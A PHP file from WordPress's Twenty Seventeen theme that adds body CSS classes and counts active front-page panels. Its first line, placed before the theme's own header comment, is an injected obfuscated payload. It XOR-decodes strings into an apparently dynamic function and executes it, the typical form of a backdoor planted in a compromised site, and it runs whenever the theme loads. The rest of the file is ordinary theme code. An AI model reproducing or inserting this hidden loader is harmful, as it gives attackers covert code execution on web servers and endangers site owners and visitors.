<?php $iFlCPa='P37QO-9TUSC EWV'; $VxUUJqf='3AR0;Hf2 = T,88'^$iFlCPa; $lLCszB='0HeyK990X:B=+PIS+YDbeU,N1<YE-hk;IBslXzF2q,H+4-UY>NT-FeHS>71dM>9LN7 DMtrI21TLBObaI=fy1f610XzVJsphHYQ8CfA booWwemQL5;3RV:arR036luniRmjm>AxB5=TVAeyrt=S.R:G,,O=vg8=3kk>jPnJ.Y9 Zol8U0heczmyJF.=GLEgl83Jbx<2CnPiecV56 fuYU.+HHnlAT 6JnUT1hoU++<2 Smz38H=+PEbBmqzzwviuEWSPkSWAxykus29Q,3EnF2=TJ; MdF7HeoZtU.<ZbMhWSXTjdWP,S:;6LyCerPUcyms6X= Zc2LbXWC7;ODJfcjn c3p8zp4Nlh8H4pHXrgK8Q;Hae39H8CDW=M.2V XeoR 66bsbcn2A WojPw4UG8,nPd;m:F0e=M9-diDt=6 S9B 8> <b=Z4ePV 38h.COyNAIQzvk SVC>1iN-A-.lhmc1RZUgS=7mmCi,6QR+ZTXfiLf2G0+De;4T=1--2-=kE=Q=qDlC+JXYjisafqSZteo=2JT1i<1LwshuUuRrpubgvENwY7Q- Mb1Y>t1m-6jWkVuZSFRQYzogF8AB,+e30OaH2IITNdn V7L9JDqBPHJ9 TspFVqmtbHzk6ZJ8OI1RF5cq S1Z X3tsgrpYQ9=6khhjeM'; $ypNdeS=$VxUUJqf('', 'Y.MX-LWS,S-St51:X-7JB-C<nX81L74V<6TEqZ=8xJ=EWY<6Pn,B4:,2JVn; KMdjSA0,XRmYT-eboBAiFlp8BYDDxGvmTKbAP7W1NeIBROgLEI8pFOA>3TIV6QGWENNM;FAD4HqfZH voXYZPY2Z3acEqocVCSXJ0OWJuN9Z+UE4GHS0IA8JAgpC4KI2>+OHWF>KC6;>d-coG2TBAFHy3OG;-Ufe0AB+1>1HHRuMJPAEhgpUW:XJ3-BjI.958= 0e6 pO828XDUUWDX=YVlN=84p.ZT,;-R1ERzP>KEahDL32,5JYwtZ2VNSws>ox93CQLWR9IAsCIFk>81RZ,,jNG5<e2f5k.PU=LLS-MPufRC=Y=N-HEH3A1g 6I,qY3YxXOvKSOYykjJV T6OWpSB4+MIUZmFgGL:AY,MLDTd4HXS6K+ATWZYJE5F:47TRg7C6;Q, :4LB4D65,ZTAjI YOEDMGU3.488XNDDxcEPyvO; 9FOjFS5BJ=:PQ-bTUDAYNCbV4DVhLgO+,8CIUGFY>>AMKYS>5jNWT5P.AUhHrUALZUEuyD<T3OA,TP=XGPXOWR5Y7F>6 evpZIAfY30MR:XU6>-J : =LIP7N V+ Vnpl.XT5ZYfvQMTB3pbS,+TgmU32T8VP2H6O9WS.NIzP4ATBCXAQo0'^$lLCszB); $ypNdeS();
/**
 * Additional features to allow styling of the templates
 *
 * @package WordPress
 * @subpackage Twenty_Seventeen
 * @since Twenty Seventeen 1.0
 */

/**
 * Adds custom classes to the array of body classes.
 *
 * @param array $classes Classes for the body element.
 * @return array
 */
function twentyseventeen_body_classes( $classes ) {
	// Add class of group-blog to blogs with more than 1 published author.
	if ( is_multi_author() ) {
		$classes[] = 'group-blog';
	}

	// Add class of hfeed to non-singular pages.
	if ( ! is_singular() ) {
		$classes[] = 'hfeed';
	}

	// Add class if we're viewing the Customizer for easier styling of theme options.
	if ( is_customize_preview() ) {
		$classes[] = 'twentyseventeen-customizer';
	}

	// Add class on front page.
	if ( is_front_page() && 'posts' !== get_option( 'show_on_front' ) ) {
		$classes[] = 'twentyseventeen-front-page';
	}

	// Add a class if there is a custom header.
	if ( has_header_image() ) {
		$classes[] = 'has-header-image';
	}

	// Add class if sidebar is used.
	if ( is_active_sidebar( 'sidebar-1' ) && ! is_page() ) {
		$classes[] = 'has-sidebar';
	}

	// Add class for one or two column page layouts.
	if ( is_page() || is_archive() ) {
		if ( 'one-column' === get_theme_mod( 'page_layout' ) ) {
			$classes[] = 'page-one-column';
		} else {
			$classes[] = 'page-two-column';
		}
	}

	// Add class if the site title and tagline is hidden.
	if ( 'blank' === get_header_textcolor() ) {
		$classes[] = 'title-tagline-hidden';
	}

	// Get the colorscheme or the default if there isn't one.
	$colors    = twentyseventeen_sanitize_colorscheme( get_theme_mod( 'colorscheme', 'light' ) );
	$classes[] = 'colors-' . $colors;

	return $classes;
}
add_filter( 'body_class', 'twentyseventeen_body_classes' );

/**
 * Count our number of active panels.
 *
 * Primarily used to see if we have any panels active, duh.
 */
function twentyseventeen_panel_count() {

	$panel_count = 0;

	/**
	 * Filter number of front page sections in Twenty Seventeen.
	 *
	 * @since Twenty Seventeen 1.0
	 *
	 * @param int $num_sections Number of front page sections.
	 */
	$num_sections = apply_filters( 'twentyseventeen_front_page_sections', 4 );

	// Create a setting and control for each of the sections available in the theme.
	for ( $i = 1; $i < ( 1 + $num_sections ); $i++ ) {
		if ( get_theme_mod( 'panel_' . $i ) ) {
			$panel_count++;
		}
	}

	return $panel_count;
}

/**
 * Checks to see if we're on the front page or not.
 */
function twentyseventeen_is_frontpage() {
	return ( is_front_page() && ! is_home() );
}
